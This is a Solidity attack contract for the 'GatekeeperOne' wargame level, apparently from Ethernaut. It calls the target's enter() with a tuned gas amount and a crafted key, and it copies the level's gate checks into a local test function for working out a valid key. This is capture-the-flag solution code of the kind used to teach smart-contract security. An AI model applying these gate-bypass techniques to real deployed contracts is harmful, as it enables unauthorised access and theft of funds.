// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttack {
    IGatekeeperOne public challenge;

    constructor(address challengeAddress) {
        challenge = IGatekeeperOne(challengeAddress);
    }

    function attack(bytes8 gateKey, uint256 gasToUse) external payable {
        challenge.enter{gas: gasToUse}(gateKey);
    }

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function testenter(bytes8 _gateKey)
        public
        // gateOne
        // gateTwo
        gateThree(_gateKey)
        returns (bool)
    {
        return true;
    }
}
